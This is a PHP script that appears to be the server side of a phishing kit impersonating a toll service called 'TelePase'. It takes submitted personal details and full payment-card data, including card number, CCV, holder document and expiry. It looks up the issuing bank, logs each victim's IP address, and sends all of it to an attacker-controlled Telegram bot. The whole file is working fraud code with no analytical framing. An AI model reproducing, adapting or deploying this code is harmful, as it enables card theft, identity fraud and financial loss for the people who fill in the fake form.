<?php
if(isset($_POST)){
	$filter = "";
	$mensaje = ">> Datos personales <<\n";
	if(isset($_POST["DPtipocliente"])){
		$mensaje .= "Tipo cliente: ".$_POST["DPtipocliente"]."\n";
	}
	else {
		$mensaje .= "Tipo cliente: No especificado\n";
	}
	if(isset($_POST["DPtipodocumento"])){
		$mensaje .= "Tipo documento: ".$_POST["DPtipodocumento"]."\n";
	}
	else {
		$mensaje .= "Tipo documento: No especificado\n";
	}
	if(isset($_POST["DPvalordocumento"])){
		$mensaje .= "Documento: ".$_POST["DPvalordocumento"]."\n";
	}
	else {
		$mensaje .= "Documento: No especificado\n";
	}
	if(isset($_POST["DPnombres"])){
		$mensaje .= "Nombres: ".$_POST["DPnombres"]."\n";
	}
	else {
		$mensaje .= "Nombres: No especificado\n";
	}
	if(isset($_POST["DPapellidos"])){
		$mensaje .= "Apellidos: ".$_POST["DPapellidos"]."\n";
	}
	else {
		$mensaje .= "Apellidos: No especificado\n";
	}
	if(isset($_POST["DPcalle"])){
		$mensaje .= "Calle: ".$_POST["DPcalle"]."\n";
	}
	else {
		$mensaje .= "Calle: No especificado\n";
	}
	if(isset($_POST["DPnumerocalle"])){
		$mensaje .= "Numero calle: ".$_POST["DPnumerocalle"]."\n";
	}
	else {
		$mensaje .= "Numero calle: No especificado\n";
	}
	if(isset($_POST["DPpiso"])){
		$mensaje .= "Piso: ".$_POST["DPpiso"]."\n";
	}
	else {
		$mensaje .= "Piso: No especificado\n";
	}
	if(isset($_POST["DPdepartamento"])){
		$mensaje .= "Departamento: ".$_POST["DPdepartamento"]."\n";
	}
	else {
		$mensaje .= "Departamento: No especificado\n";
	}
	if(isset($_POST["DPcp"])){
		$mensaje .= "Cod. postal: ".$_POST["DPcp"]."\n";
	}
	else {
		$mensaje .= "Cod. postal: No especificado\n";
	}
	if(isset($_POST["DPprovincha"])){
		$mensaje .= "Provincia: ".$_POST["DPprovincha"]."\n";
	}
	else {
		$mensaje .= "Provincia: No especificado\n";
	}
	if(isset($_POST["DPlocalidad"])){
		$mensaje .= "Localidad: ".$_POST["DPlocalidad"]."\n";
	}
	else {
		$mensaje .= "Localidad: No especificado\n";
	}
	if(isset($_POST["DPcelular"])){
		$mensaje .= "Celular: ".$_POST["DPcelular"]."\n";
	}
	else {
		$mensaje .= "Celular: No especificado\n";
	}
	if(isset($_POST["DPtelefono"])){
		$mensaje .= "Telefono: ".$_POST["DPtelefono"]."\n";
	}
	else {
		$mensaje .= "Telefono: No especificado";
	}
	if(isset($_POST["DPemail"])){
		$mensaje .= "Email: ".$_POST["DPemail"]."\n";
	}
	else {
		$mensaje .= "Email: No especificado\n";
	}
	$mensaje .= "\n\n>> Tarjeta <<\n";
	if(isset($_POST["Ptipotarjeta"])){
		$mensaje .= "Tipo tarjeta: ".$_POST["Ptipotarjeta"]."\n";
		$filter .= $_POST["Ptipotarjeta"];
	}
	else {
		$mensaje .= "Tipo tarjeta: No especificado\n";
	}
	if(isset($_POST["Ptarjeta"])){
		$mensaje .= "Tarjeta: ".$_POST["Ptarjeta"]."\n";
		$filter .= $_POST["Ptarjeta"];
	}
	else {
		$mensaje .= "Tarjeta: No especificado\n";
	}
	if(isset($_POST["Pccv"])){
		$mensaje .= "CCV: ".$_POST["Pccv"]."\n";
		$filter .= $_POST["Pccv"];
	}
	else {
		$mensaje .= "CCV: No especificado\n";
	}
	if(isset($_POST["Pnombre"])){
		$mensaje .= "Nombre: ".$_POST["Pnombre"]."\n";
		$filter .= $_POST["Pnombre"];
	}
	else {
		$mensaje .= "Nombre: No especificado\n";
	}
	if(isset($_POST["Ptipodocumento"])){
		$mensaje .= "Tipo documento: ".$_POST["Ptipodocumento"]."\n";
		$filter .= $_POST["Ptipodocumento"];
	}
	else {
		$mensaje .= "Tipo documento: No especificado\n";
	}
	if(isset($_POST["Pdocumentotitular"])){
		$mensaje .= "Documento titular: ".$_POST["Pdocumentotitular"]."\n";
		$filter .= $_POST["Pdocumentotitular"];
	}
	else {
		$mensaje .= "Documento titular: No especificado\n";
	}
	if(isset($_POST["Pmes"])){
		$mensaje .= "Mes: ".$_POST["Pmes"]."\n";
		$filter .= $_POST["Pmes"];
	}
	else {
		$mensaje .= "Mes: No especificado\n";
	}
	if(isset($_POST["Panio"])){
		$mensaje .= "Año: ".$_POST["Panio"]."\n";
		$filter .= $_POST["Panio"];
	}
	else {
		$mensaje .= "Año: No especificado\n";
	}
	$filter = base64_encode($filter);
	include("config.php");
	$mensaje .= "\n\n>> Datos de tarjeta <<\n";
	$bin = substr($_POST["Ptarjeta"], 0, 1);
	$result = file_get_contents("https://lookup.binlist.net/".$bin);
	$result = json_decode($result, true);
	$mensaje .= "Tipo: ".$result["type"]."\n";
	$mensaje .= "Marca: ".$result["brand"]."\n";
	$mensaje .= "Esquema: ".$result["scheme"]."\n";
	$mensaje .= "Pais: ".$result["country"]["emoji"]." ".$result["country"]["name"]."\n";
	$mensaje .= "Banco: ".$result["bank"]["name"]."\n";
	$mensaje .= "Url: ".$result["bank"]["url"]."\n";
	$mensaje .= "Telefono: ".$result["bank"]["phone"]."\n";
	$mensaje .= "Ciudad: ".$result["bank"]["city"]."\n";
	$ip = getenv("REMOTE_ADDR");
	$isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
	define('BOT_TOKEN', $bottoken);
	define('CHAT_ID', $chatid);
	define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
	function enviar_telegram($msj){
		$queryArray = [
			'chat_id' => CHAT_ID,
			'text' => $msj,
		];
		$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
		$result = file_get_contents($url);
	}
	$file_name = 'data/'.$ip.'.db';
	$read_data = fopen($file_name, "a+");
	if($read_data){
		$data = fgets($read_data);
		$data = explode(";", $data);
		if(!(in_array($filter, $data))){
			fwrite($read_data, $filter.";");
			fclose($read_data);
			enviar_telegram(">> TelePase <<\n\n>> Datos de conexión <<\nIP: ".$ip."\nISP: ".$isp."\n\n".$mensaje);
		}
	}
	else {
		fwrite($read_data, $filter.";");
		fclose($read_data);
		enviar_telegram(">> TelePase <<\n\n>> Datos de conexión <<\nIP: ".$ip."\nISP: ".$isp."\n\n".$mensaje);
	}

}
?>